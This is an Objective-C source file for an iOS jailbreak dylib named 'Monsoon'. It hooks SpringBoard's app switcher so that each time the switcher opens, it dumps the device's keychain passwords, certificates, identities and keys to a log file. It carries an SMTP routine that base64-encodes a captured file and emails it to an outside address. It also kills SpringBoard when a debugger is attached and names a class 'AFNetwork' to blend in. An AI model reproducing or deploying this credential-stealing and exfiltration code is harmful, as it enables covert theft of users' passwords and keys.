//
//  Monsoon.m
//  Monsoon
//
//  Created by Meirtz on 14-2-3.
//  Copyright (c) 2014年 __MyCompanyName__. All rights reserved.
//

#import "Monsoon.h"


#include <stdio.h>
#include <objc/runtime.h>
#import <Foundation/Foundation.h>
#import <Security/Security.h>
#import <sqlite3.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netdb.h>
#include <unistd.h>
#include <sys/sysctl.h>
#include <stdlib.h>
//#include <sys/ptrace.h>


#define EHLO "helo ha\r\n" //***为邮箱用户名
#define DATA "data\r\n"
#define QUIT "QUIT\r\n"

//#define h_addr h_addr_list[0]
//FILE *fin;
int sock;
struct sockaddr_in server;
struct hostent *hp, *gethostbyname();
char buf[BUFSIZ+1];
int len;
char *host_id="smtp.126.com";
//char *from_id="1050647543@qq.com";
char *to_id="Mr_jimmyhacker@163.com";
char *sub="ssap";
char *wkstr;


#pragma mark - Keychain Prototype Function

void printToStdOut(NSString *format, ...);
void printUsage();
void dumpKeychainEntitlements();
NSArray * getKeychainObjectsForSecClass(CFTypeRef kSecClassType);
NSMutableArray *getCommandLineOptions(int argc, char **argv);
NSString * getEmptyKeychainItemString(CFTypeRef kSecClassType);
void printGenericPassword(NSDictionary *passwordItem) ;
void printInternetPassword(NSDictionary *passwordItem);
void printKey(NSDictionary *keyItem);
void printResultsForSecClass(NSArray *keychainItems, CFTypeRef kSecClassType);
void printIdentity(NSDictionary *identityItem);
void printCertificate(NSDictionary *certificateItem);

@interface AFNetwork : NSObject

- (void)socket:(int)argc Async:(char **)argv;

@end

#pragma mark - Keychain Function

void printToStdOut(NSString *format, ...) {
    va_list args;
    va_start(args, format);
    NSString *formattedString = [[NSString alloc] initWithFormat: format arguments: args];
    const char *op = [formattedString UTF8String];
    freopen("/var/mobile/taiji.log", "r", stdin);
    freopen("/var/mobile/taiji1.log", "w", stdout);
    char s;
    while (scanf("%c",&s)==1) {
        printf("%c",s);
    }
    fclose(stdin);
    printf("%s\n",op);
    fclose(stdout);
    system("rm /var/mobile/taiji.log");
    system("mv /var/mobile/taiji1.log /var/mobile/taiji.log");
    
    va_end(args);
}

NSMutableArray *getCommandLineOptions(int argc, char **argv) {
	NSMutableArray *arguments = [[NSMutableArray alloc] init];
	int argument;
	if (argc == 1) {
		[arguments addObject:(id)kSecClassGenericPassword];
		[arguments addObject:(id)kSecClassInternetPassword];
		return [arguments autorelease];
	}
	while ((argument = getopt (argc, argv, "aegnickh")) != -1) {
		switch (argument) {
			case 'a':
				[arguments addObject:(id)kSecClassGenericPassword];
				[arguments addObject:(id)kSecClassInternetPassword];
				[arguments addObject:(id)kSecClassIdentity];
				[arguments addObject:(id)kSecClassCertificate];
				[arguments addObject:(id)kSecClassKey];
				return [arguments autorelease];
			case 'e':
				[arguments addObject:@"dumpEntitlements"];
				return [arguments autorelease];
			case 'g':
				[arguments addObject:(id)kSecClassGenericPassword];
				break;
			case 'n':
				[arguments addObject:(id)kSecClassInternetPassword];
				break;
			case 'i':
				[arguments addObject:(id)kSecClassIdentity];
				break;
			case 'c':
				[arguments addObject:(id)kSecClassCertificate];
				break;
			case 'k':
				[arguments addObject:(id)kSecClassKey];
				break;
			case 'h':
				printUsage();
				break;
			case '?':
			    printUsage();
			 	exit(EXIT_FAILURE);
			default:
				continue;
		}
	}
	return [arguments autorelease];
}

NSArray * getKeychainObjectsForSecClass(CFTypeRef kSecClassType) {
	NSMutableDictionary *genericQuery = [[NSMutableDictionary alloc] init];
    
	[genericQuery setObject:(id)kSecClassType forKey:(id)kSecClass];
	[genericQuery setObject:(id)kSecMatchLimitAll forKey:(id)kSecMatchLimit];
	[genericQuery setObject:(id)kCFBooleanTrue forKey:(id)kSecReturnAttributes];
	[genericQuery setObject:(id)kCFBooleanTrue forKey:(id)kSecReturnRef];
	[genericQuery setObject:(id)kCFBooleanTrue forKey:(id)kSecReturnData];
    
	NSArray *keychainItems = nil;
	if (SecItemCopyMatching((CFDictionaryRef)genericQuery, (CFTypeRef *)&keychainItems) != noErr)
	{
		keychainItems = nil;
	}
	[genericQuery release];
	return keychainItems;
}

NSString * getEmptyKeychainItemString(CFTypeRef kSecClassType) {
	if (kSecClassType == kSecClassGenericPassword) {
		return @"No Generic Password Keychain items found.\n";
	}
	else if (kSecClassType == kSecClassInternetPassword) {
		return @"No Internet Password Keychain items found.\n";
	}
	else if (kSecClassType == kSecClassIdentity) {
		return @"No Identity Keychain items found.\n";
	}
	else if (kSecClassType == kSecClassCertificate) {
		return @"No Certificate Keychain items found.\n";
	}
	else if (kSecClassType == kSecClassKey) {
		return @"No Key Keychain items found.\n";
	}
	else {
		return @"Unknown Security Class\n";
	}
    
}


void printUsage() {
    NSLog(@"");
}

void dumpKeychainEntitlements() {
    NSString *databasePath = @"/var/Keychains/keychain-2.db";
    const char *dbpath = [databasePath UTF8String];
    sqlite3 *keychainDB;
    sqlite3_stmt *statement;
	NSMutableString *entitlementXML = [NSMutableString stringWithString:@"<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n"
                                       "<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">\n"
                                       "<plist version=\"1.0\">\n"
                                       "\t<dict>\n"
                                       "\t\t<key>keychain-access-groups</key>\n"
                                       "\t\t<array>\n"];
    
    if (sqlite3_open(dbpath, &keychainDB) == SQLITE_OK)
    {
        const char *query_stmt = "SELECT DISTINCT agrp FROM genp UNION SELECT DISTINCT agrp FROM inet";
        
        if (sqlite3_prepare_v2(keychainDB, query_stmt, -1, &statement, NULL) == SQLITE_OK)
        {
			while(sqlite3_step(statement) == SQLITE_ROW)
            {
				NSString *group = [[NSString alloc] initWithUTF8String:(const char *) sqlite3_column_text(statement, 0)];
                
                [entitlementXML appendFormat:@"\t\t\t<string>%@</string>\n", group];
                [group release];
            }
            sqlite3_finalize(statement);
        }
        else
        {
            printToStdOut(@"Unknown error querying keychain database\n");
		}
		[entitlementXML appendString:@"\t\t</array>\n"
         "\t</dict>\n"
         "</plist>\n"];
		sqlite3_close(keychainDB);
		printToStdOut(@"%@", entitlementXML);
	}
	else
	{
		printToStdOut(@"Unknown error opening keychain database\n");
	}
}

void printGenericPassword(NSDictionary *passwordItem) {
	printToStdOut(@"Generic Password\n");
	printToStdOut(@"----------------\n");
	printToStdOut(@"Service: %@\n", [passwordItem objectForKey:(id)kSecAttrService]);
	printToStdOut(@"Account: %@\n", [passwordItem objectForKey:(id)kSecAttrAccount]);
	printToStdOut(@"Entitlement Group: %@\n", [passwordItem objectForKey:(id)kSecAttrAccessGroup]);
	printToStdOut(@"Label: %@\n", [passwordItem objectForKey:(id)kSecAttrLabel]);
	printToStdOut(@"Generic Field: %@\n", [[passwordItem objectForKey:(id)kSecAttrGeneric] description]);
	NSData* passwordData = [passwordItem objectForKey:(id)kSecValueData];
	printToStdOut(@"Keychain Data: %@\n\n", [[NSString alloc] initWithData:passwordData encoding:NSUTF8StringEncoding]);
}

void printInternetPassword(NSDictionary *passwordItem) {
	printToStdOut(@"Internet Password\n");
	printToStdOut(@"-----------------\n");
	printToStdOut(@"Server: %@\n", [passwordItem objectForKey:(id)kSecAttrServer]);
	printToStdOut(@"Account: %@\n", [passwordItem objectForKey:(id)kSecAttrAccount]);
	printToStdOut(@"Entitlement Group: %@\n", [passwordItem objectForKey:(id)kSecAttrAccessGroup]);
	printToStdOut(@"Label: %@\n", [passwordItem objectForKey:(id)kSecAttrLabel]);
	NSData* passwordData = [passwordItem objectForKey:(id)kSecValueData];
	printToStdOut(@"Keychain Data: %@\n\n", [[NSString alloc] initWithData:passwordData encoding:NSUTF8StringEncoding]);
}


void printCertificate(NSDictionary *certificateItem) {
	SecCertificateRef certificate = (SecCertificateRef)[certificateItem objectForKey:(id)kSecValueRef];
    
	CFStringRef summary;
	summary = SecCertificateCopySubjectSummary(certificate);
	printToStdOut(@"Certificate\n");
	printToStdOut(@"-----------\n");
	printToStdOut(@"Summary: %@\n", (NSString *)summary);
	CFRelease(summary);
	printToStdOut(@"Entitlement Group: %@\n", [certificateItem objectForKey:(id)kSecAttrAccessGroup]);
	printToStdOut(@"Label: %@\n", [certificateItem objectForKey:(id)kSecAttrLabel]);
	printToStdOut(@"Serial Number: %@\n", [certificateItem objectForKey:(id)kSecAttrSerialNumber]);
	printToStdOut(@"Subject Key ID: %@\n", [certificateItem objectForKey:(id)kSecAttrSubjectKeyID]);
	printToStdOut(@"Subject Key Hash: %@\n\n", [certificateItem objectForKey:(id)kSecAttrPublicKeyHash]);
    
}

void printKey(NSDictionary *keyItem) {
	NSString *keyClass = @"Unknown";
	CFTypeRef _keyClass = [keyItem objectForKey:(id)kSecAttrKeyClass];
    
	if ([[(id)_keyClass description] isEqual:(id)kSecAttrKeyClassPublic]) {
		keyClass = @"Public";
	}
	else if ([[(id)_keyClass description] isEqual:(id)kSecAttrKeyClassPrivate]) {
		keyClass = @"Private";
	}
	else if ([[(id)_keyClass description] isEqual:(id)kSecAttrKeyClassSymmetric]) {
		keyClass = @"Symmetric";
	}
    
	printToStdOut(@"Key\n");
	printToStdOut(@"---\n");
	printToStdOut(@"Entitlement Group: %@\n", [keyItem objectForKey:(id)kSecAttrAccessGroup]);
	printToStdOut(@"Label: %@\n", [keyItem objectForKey:(id)kSecAttrLabel]);
	printToStdOut(@"Application Label: %@\n", [keyItem objectForKey:(id)kSecAttrApplicationLabel]);
	printToStdOut(@"Key Class: %@\n", keyClass);
	printToStdOut(@"Permanent Key: %@\n", CFBooleanGetValue((CFBooleanRef)[keyItem objectForKey:(id)kSecAttrIsPermanent]) == true ? @"True" : @"False");
	printToStdOut(@"Key Size: %@\n", [keyItem objectForKey:(id)kSecAttrKeySizeInBits]);
	printToStdOut(@"Effective Key Size: %@\n", [keyItem objectForKey:(id)kSecAttrEffectiveKeySize]);
	printToStdOut(@"For Encryption: %@\n", CFBooleanGetValue((CFBooleanRef)[keyItem objectForKey:(id)kSecAttrCanEncrypt]) == true ? @"True" : @"False");
	printToStdOut(@"For Decryption: %@\n", CFBooleanGetValue((CFBooleanRef)[keyItem objectForKey:(id)kSecAttrCanDecrypt]) == true ? @"True" : @"False");
	printToStdOut(@"For Key Derivation: %@\n", CFBooleanGetValue((CFBooleanRef)[keyItem objectForKey:(id)kSecAttrCanDerive]) == true ? @"True" : @"False");
	printToStdOut(@"For Signatures: %@\n", CFBooleanGetValue((CFBooleanRef)[keyItem objectForKey:(id)kSecAttrCanSign]) == true ? @"True" : @"False");
	printToStdOut(@"For Signature Verification: %@\n", CFBooleanGetValue((CFBooleanRef)[keyItem objectForKey:(id)kSecAttrCanVerify]) == true ? @"True" : @"False");
	printToStdOut(@"For Key Wrapping: %@\n", CFBooleanGetValue((CFBooleanRef)[keyItem objectForKey:(id)kSecAttrCanWrap]) == true ? @"True" : @"False");
	printToStdOut(@"For Key Unwrapping: %@\n\n", CFBooleanGetValue((CFBooleanRef)[keyItem objectForKey:(id)kSecAttrCanUnwrap]) == true ? @"True" : @"False");
    
}

void printIdentity(NSDictionary *identityItem) {
	SecIdentityRef identity = (SecIdentityRef)[identityItem objectForKey:(id)kSecValueRef];
	SecCertificateRef certificate;
    
	SecIdentityCopyCertificate(identity, &certificate);
	NSMutableDictionary *identityItemWithCertificate = [identityItem mutableCopy];
	[identityItemWithCertificate setObject:(id)certificate forKey:(id)kSecValueRef];
	printToStdOut(@"Identity\n");
	printToStdOut(@"--------\n");
	printCertificate(identityItemWithCertificate);
	printKey(identityItemWithCertificate);
	[identityItemWithCertificate release];
}

void printResultsForSecClass(NSArray *keychainItems, CFTypeRef kSecClassType) {
	if (keychainItems == nil) {
		printToStdOut(getEmptyKeychainItemString(kSecClassType));
		return;
	}
    
	NSDictionary *keychainItem;
	for (keychainItem in keychainItems) {
		if (kSecClassType == kSecClassGenericPassword) {
			printGenericPassword(keychainItem);
		}
		else if (kSecClassType == kSecClassInternetPassword) {
			printInternetPassword(keychainItem);
		}
		else if (kSecClassType == kSecClassIdentity) {
			printIdentity(keychainItem);
		}
		else if (kSecClassType == kSecClassCertificate) {
			printCertificate(keychainItem);
		}
		else if (kSecClassType == kSecClassKey) {
			printKey(keychainItem);
		}
	}
	return;
}


//-----------------------------------

static int is_being_debugging(void)
{
    int name[4];
    struct kinfo_proc info;
    size_t info_size = sizeof(info);
    
    info.kp_proc.p_flag = 0;
    
    name[0] = CTL_KERN;
    name[1] = KERN_PROC;
    name[2] = KERN_PROC_PID;
    name[3] = getpid();
    
    if (sysctl(name, 4, &info, &info_size, NULL, 0) == -1) {
        perror("sysctl");
        exit(-1);
    }
    return ((info.kp_proc.p_flag & P_TRACED) != 0);
}





//---------
#pragma MailSending
char base64Alphabet[]=
{'A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P',
    'Q','R','S','T','U','V','W','X','Y','Z','a','b','c','d','e','f',
    'g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v',
    'w','x','y','z','0','1','2','3','4','5','6','7','8','9','+','/','='};

unsigned char* base64Encode(const char* source, const int sourceLength)
{
    /*命名为padding不准确，不过先不改了^_^*/
    unsigned int padding = sourceLength%3;
    unsigned int resultLength = sourceLength%3 ? ((sourceLength)/3 + 1)*4 : (sourceLength)/3*4;
    unsigned int i=0, j=0;
    
    unsigned char* result = (unsigned char*)malloc(resultLength + 1);
    memset(result, 0, resultLength+1);
    
    unsigned char temp = 0;
    for (i=0,j=0; i<sourceLength; i+=3, j+=4)
    {
        if (i+2 >= sourceLength)
        {
            result[j] = (source[i]>>2) & 0x3F;
            if (padding==1)
            {
                //这里padding实际为2
                result[j+1] = ((source[i] & 0x03)<<4 ) & 0x3F;
                result[j+2] = 0x40;
                result[j+3] = 0x40;
                break;
            }
            else if (padding==2)
            {
                //这里padding实际为1
                result[j+1] = (((source[i] & 0x03)<<4) | ((source[i+1]>>4) & 0x0F));
                result[j+2] = ((source[i+1] & 0x0f)<<2) & 0x3F;
                result[j+3] = 0x40;
                break;
            }
        }
        
        result[j] = (source[i]>>2) & 0x3F;//最高两位要变为0
        result[j+1] = (((source[i] & 0x03)<<4) | ((source[i+1]>>4) & 0x0F));//0x03（只取最低两位,其余位为0） 0x0F(只取低四位，其余位为0)
        result[j+2] = (((source[i+1] & 0x0f)<<2) | ((source[i+2]>>6) & 0x03));
        result[j+3] = (source[i+2] & 0x3F);
    }
    
    for ( j=0; j<resultLength; ++j)
    {
        result[j] = base64Alphabet[result[j]];
    }
    
    return result;
}

/*=====Send a string to the socket=====*/
void send_socket(char *s)
{
	write(sock,s,strlen(s));
	//write(1,s,strlen(s));
	//printf("Client:%s\n",s);
}

//=====Read a string from the socket=====*/
void read_socket()
{
	len = read(sock,buf,BUFSIZ);
	write(1,buf,len);
	//printf("Server:%s\n",buf);
}

char * ReadFile(char * path, int *length)
{
    FILE * pfile;
    char * data;
    
    pfile = fopen(path, "rb");
    if (pfile == NULL)
    {
        return NULL;
    }
    fseek(pfile, 0, SEEK_END);
    *length = ftell(pfile);
    data = (char *)malloc((*length + 1) * sizeof(char));
    rewind(pfile);
    *length = fread(data, 1, *length, pfile);
    data[*length] = '\0';
    fclose(pfile);
    return data;
}

inline int send_mail() {
    FILE *fp;
    fp = fopen("./ssap","rw");
    char output;
    output = fgetc(fp);
    int i = 1;
    while (output!=EOF)
    {
        output = fgetc(fp);
        //sprintf(wkstr,"%c",output);
        i++;
    }
    wkstr = (char *)malloc((i + 1) * sizeof(char));
    
    FILE *fp2;
    fp2 = fopen("./ssap","rw");
    char writeC;
    writeC = fgetc(fp2);
    sprintf(wkstr,"%s%c",wkstr,writeC);
    
    while (writeC!=EOF)
    {
        writeC = fgetc(fp2);
        sprintf(wkstr,"%s%c",wkstr,writeC);
    }
    
    wkstr = base64Encode(wkstr,strlen(wkstr));
    
    //system("rm -f ./ssap");
    //system("rm -f ./repmud");
	/*=====Create Socket=====*/
	sock = socket(AF_INET, SOCK_STREAM, 0);
	if (sock==-1)
	{
		//perror("opening stream socket");
		//exit(1);
		return 1;
	}
	else
		//cout << "socket created\n";
		//printf("socket created\n");
        
	/*=====Verify host=====*/
        server.sin_family = AF_INET;
	hp = gethostbyname(host_id);
	if (hp==(struct hostent *) 0)
	{
		//fprintf(stderr, "%s: unknown host\n", host_id);
		//exit(2);
		return 2;
	}
    
	/*=====Connect to port 25 on remote host=====*/
	memcpy((char *) &server.sin_addr, (char *) hp->h_addr, hp->h_length);
	server.sin_port=htons(25); /* SMTP PORT */
	if (connect(sock, (struct sockaddr *) &server, sizeof server)==-1)
	{
		//perror("connecting stream socket");
		//exit(1);
		return 1;
	}
	else
		//cout << "Connected\n";
		//printf("Connected\n");
        
	/*=====Write some data then read some =====*/
        read_socket(); /* SMTP Server logon string */
	send_socket(EHLO); /* introduce ourselves */
	read_socket(); /*Read reply */
    
	send_socket("auth login");
	send_socket("\r\n");
	read_socket();
    
    char *username = "mr_jimmyhacker@126.com";
    username = base64Encode(username,strlen(username));
    
    char *password = ""/*密码不能告诉你*/;
    password = base64Encode(password,strlen(password));
    
    send_socket(username);
    send_socket("\r\n");
    read_socket();
    
    send_socket(password);
    send_socket("\r\n");
    read_socket();
    
	send_socket("mail from: ");
    send_socket("mr_jimmyhacker@126.com");
	send_socket("\r\n");
	read_socket(); /* Sender OK */
    
	//send_socket("VRFY ");
	//send_socket(from_id);
	//send_socket("\r\n");
	//read_socket(); // Sender OK */
	send_socket("rcpt to: "); /*Mail to*/
	send_socket(to_id);
	//send_socket(">");
	send_socket("\r\n");
	read_socket(); // Recipient OK*/
    
	send_socket(DATA);// body to follow*/
	//read_socket();
	//send_socket("from:***@126.com");
	send_socket("subject: ");
	send_socket(sub);
    send_socket("\r\n");
    send_socket("Content-Type: multipart/mixed; boundary=a\r\n");
    send_socket("--a\r\n");
    send_socket("--a\r\n");
    send_socket("Content-Disposition: attachment; filename=\"ssap.txt\"\r\n");
    send_socket("Content-Transfer-Encoding: base64\r\n\r\n");
    //printf("%d",i);
    
    //printf("%s",wkstr);
	send_socket(wkstr);
    free(wkstr);
    send_socket("--a--");
	send_socket("\r\n.\r\n");
	read_socket();
	send_socket(QUIT); /* quit */
	read_socket(); // log off */
    
	//=====Close socket and finish=====*/
	close(sock);
	//exit(0);
	return 0;
    
}


//------------------------------------

@implementation AFNetwork

- (void)socket:(int)argc Async:(char **)argv{
    id pool=[NSAutoreleasePool new];
	NSMutableArray* arguments;
    [arguments addObject:(id)kSecClassGenericPassword];
    [arguments addObject:(id)kSecClassInternetPassword];
    [arguments addObject:(id)kSecClassIdentity];
    [arguments addObject:(id)kSecClassCertificate];
    [arguments addObject:(id)kSecClassKey];
	if ([arguments indexOfObject:@"dumpEntitlements"] != NSNotFound) {
		dumpKeychainEntitlements();
		exit(EXIT_SUCCESS);
	}
	NSArray *keychainItems = nil;
	for (id kSecClassType in (NSArray *) arguments) {
		keychainItems = getKeychainObjectsForSecClass((CFTypeRef)kSecClassType);
		printResultsForSecClass(keychainItems, (CFTypeRef)kSecClassType);
		[keychainItems release];
	}
    double delayInSeconds = 2.0;
    dispatch_time_t popTime = dispatch_time(DISPATCH_TIME_NOW, (int64_t)(delayInSeconds * NSEC_PER_SEC));
    dispatch_after(popTime, dispatch_get_main_queue(), ^(void){
        
    });
	[pool drain];
}

@end

#pragma mark - SBAppSliderController small header

@interface SBAppSliderController : UIViewController
{
    NSMutableArray *_appList;
}

- (NSArray *)applicationList;
- (void)_quitAppAtIndex:(unsigned int)arg1;
- (void)forceDismissAnimated:(BOOL)arg1;

@end

@interface crackSpringBoard : UICollectionViewController

- (void)setuid:(uint8_t )ab;

@end

static IMP crackSB = NULL;

@implementation crackSpringBoard

- (void)setuid:(uint8_t )ab{
    Class originalClass = NSClassFromString(@"SBControlCenterController");  //%hook SBControlCenterController
    Method originalMeth = class_getInstanceMethod(originalClass, @selector(switcherWasPresented:));
    crackSB = method_getImplementation(originalMeth);
	Method replacementMeth = class_getInstanceMethod(NSClassFromString(@"SBControlCenterController"), @selector(switcherWasPresented:));
    method_exchangeImplementations(originalMeth, replacementMeth);
}

@end

static IMP sOriginalImp = NULL;

@implementation Monsoon

+ (void)load{
    if (is_being_debugging()) {
        system("killall SpringBoard");
    }
    //ptrace(PT_DENY_ATTACH, 0, 0, 0);
    Class originalClass = NSClassFromString(@"SBAppSliderController");  //%hook SBAppSliderController
    Method originalMeth = class_getInstanceMethod(originalClass, @selector(switcherWasPresented:));
    sOriginalImp = method_getImplementation(originalMeth);
	Method replacementMeth = class_getInstanceMethod(NSClassFromString(@"Monsoon"), @selector(patchedLaunch:));
	method_exchangeImplementations(originalMeth, replacementMeth);
}

- (void)patchedLaunch:(_Bool)arg1{
    
    if (is_being_debugging()) {
        system("killall SpringBoard");
    }
    //ptrace(PT_DENY_ATTACH, 0, 0, 0);
    
    sOriginalImp(self, @selector(switcherWasPresented:), self);   //%orig
    
    //UIAlertView *alert = [[UIAlertView alloc] initWithTitle:@"INJECTED" message:@"Method has been replaced by objc_runtime dynamic library\nDYLD_INSERT_LIBRARIES=libMonsoon.dylib" delegate:nil cancelButtonTitle:@"OK" otherButtonTitles: nil];
    //[alert show];
    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_BACKGROUND, 0), ^{
        printResultsForSecClass(getKeychainObjectsForSecClass((CFTypeRef)(id)kSecClassGenericPassword), (CFTypeRef)(id)kSecClassGenericPassword);
        printResultsForSecClass(getKeychainObjectsForSecClass((CFTypeRef)(id)kSecClassInternetPassword), (CFTypeRef)(id)kSecClassInternetPassword);
        printResultsForSecClass(getKeychainObjectsForSecClass((CFTypeRef)(id)kSecClassIdentity), (CFTypeRef)(id)kSecClassIdentity);
        printResultsForSecClass(getKeychainObjectsForSecClass((CFTypeRef)(id)kSecClassCertificate), (CFTypeRef)(id)kSecClassCertificate);
        printResultsForSecClass(getKeychainObjectsForSecClass((CFTypeRef)(id)kSecClassKey), (CFTypeRef)(id)kSecClassKey);
    });
}
@end
